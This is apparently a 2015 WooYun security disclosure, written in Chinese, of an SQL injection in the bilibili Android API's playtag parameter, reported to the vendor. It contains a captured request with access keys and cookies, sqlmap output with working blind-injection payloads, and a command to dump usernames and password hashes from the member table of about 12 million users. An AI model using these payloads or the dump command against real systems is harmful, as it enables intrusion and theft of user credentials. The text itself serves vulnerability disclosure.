wybug_title: App安全之bilibili客户端存在sql注入（影响千万用户安全）
wybug_detail:
漏洞详情 披露状态：   									2015-08-02：	细节已通知厂商并且等待厂商处理中									2015-08-02：	厂商已经确认，细节仅向厂商公开									2015-08-05：	细节向第三方安全合作伙伴开放									2015-09-26：	细节向核心白帽子及相关领域专家公开									2015-10-06：	细节向普通白帽子公开									2015-10-16：	细节向实习白帽子公开									2015-10-31：	细节向公众公开  简要描述： rt 详细说明：  bilibili的注入真难找呀...手机代理burp抓包GET /search_recommend?_device=android&_hwid=3029927d46659793&_ulv=5000&access_key=76b5b9bdfe34bb8e2a809ba718ac5c6e&appkey=c1b107428d337928&main_ver=v2&platform=android&playtag=2634430&recommend_type=related_post&rindex=1&sign=8ec7f03f380c8a0e289698cb4e75985f HTTP/1.1Host: api.bilibili.comUser-Agent: undefinedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: pgv_pvi=8880050176; fts=1532673349684; sid=d7qjzulp; PLHistory=9bRb%7Cn kQo; DedeID=2190533Connection: keep-alive存在问题的地址http://api.bilibili.com/search_recommend?_device=android&_hwid=3029927d46659793&_ulv=5000&access_key=76b5b9bdfe34bb8e2a809ba718ac5c6e&appkey=c1b107428d337928&main_ver=v2&platform=android&playtag=2634430&recommend_type=related_post&rindex=1&sign=8ec7f03f380c8a0e289698cb4e75985fsend to sqlmapC:\Users\bin\Desktop\win7\burpsuite_pro\burpsuite_pro_v1.5.18>sqlmap.py -r C:\Users\bin\AppData\Local\Temp\\1438479437091.req  --current-db    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 09:46:32[09:46:32] [INFO] parsing HTTP request from 'C:\Users\bin\AppData\Local\Temp\\1438479437091.req'[09:46:32] [INFO] resuming back-end DBMS 'mysql'[09:46:32] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: playtag    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: _device=android&_hwid=3029927d46659793&_ulv=5000&access_key=76b5b9bdfe34bb8e2a809ba718ac5c6e&appkey=c1b107428d337928&main_ver=v2&platform=android&playtag=2634430 AND 8650=8650&recommend_type=related_post&rindex=1&sign=8ec7f03f380c8a0e289698cb4e75985f    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: _device=android&_hwid=3029927d46659793&_ulv=5000&access_key=76b5b9bdfe34bb8e2a809ba718ac5c6e&appkey=c1b107428d337928&main_ver=v2&platform=android&playtag=2634430 AND SLEEP(5)&recommend_type=related_post&rindex=1&sign=8ec7f03f380c8a0e289698cb4e75985f---[09:46:32] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11[09:46:32] [INFO] fetching current database[09:46:32] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[09:46:32] [INFO] retrieved:[09:46:34] [WARNING] reflective value(s) found and filtering outbilibilicurrent database:    'bilibili'[09:47:04] [INFO] fetched data logged to text files under 'C:\Users\bin\Desktop\win7\burpsuite_pro\burpsuite_pro_v1.5.18\output\api.bilibili.com'跑账户密码-D bilibili -T dede_member -C username,pwd --dump测试的时候是存在12372246位用户的。网速卡不跑了上张图   漏洞证明：  

   修复方案：  参数playtag   版权声明：转载请注明来源 郭斯特@乌云
